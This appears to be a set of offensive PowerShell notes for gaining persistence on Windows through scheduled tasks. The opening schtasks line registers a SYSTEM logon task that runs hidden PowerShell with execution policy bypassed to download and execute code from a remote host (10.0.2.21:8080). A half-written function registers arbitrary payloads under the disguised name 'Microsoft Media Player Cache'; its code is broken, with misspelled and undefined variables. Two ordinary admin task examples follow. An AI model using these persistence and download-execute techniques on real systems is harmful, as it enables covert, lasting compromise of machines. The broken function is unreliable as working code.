schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" 
    /sc onlogon /ru System

function Add-PersistScheduledTask {
    [CmdletBinding()]
    Param(
    [Parameter(Mandatory)]
    [string]$Trigger,

    [Parameter(Mandatory=$false)]
    [string]$Name = "Microsoft Media Player Cache",

    [Parameter(Mandatory)]
    [string]$Payload
    )

    switch -Wildcard ("$Trigger") {
        "logon" {$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn}
        "startup" {$TaskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -minutes 2)}
        Default {}
    }
    # WIP based on Example #1
    $TaksAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NonI -NoP -W 1 -Ep Bypass -C {$Payload}"
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay (New-TimeSpan -minutes 3)
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskname -Description $taskdescription -Settings $settings -User "System"

# Example #2
    $User= "DOMAIN\user"
    $Trigger = New-ScheduledTaskTrigger -Once -At $TriggerInfo
    $Action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NonInteractive -NoLogo -NoProfile -File c:/Users/user/documents/script.ps1"
    Register-ScheduledTask -TaskName "TaskScheduler" -Trigger $Trigger -User $User -Action $Action -RunLevel Highest –Force

# Example #3
    $Prog = $env:systemroot + "\system32\WindowsPowerShell\v1.0\powershell.exe"
$Opt = "-nologo -noninteractive -noprofile -ExecutionPolicy BYPASS -file \\mydomain.local\NETLOGON\Monitoring\monitoring.ps1"
$Action = New-ScheduledTaskAction -Execute $Prog -Argument $Opt 
$Trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 1 -RandomDelay "00:30" -At "08:00"
$Trigger.Repetition = $(New-ScheduledTaskTrigger -Once -RandomDelay "00:30" -At "08:00" -RepetitionDuration "12:00" -RepetitionInterval "01:00").Repetition
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Task = Register-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -TaskName "Monitor-PS1-V001" -Description "Starts Monitoring-Script" -Force
}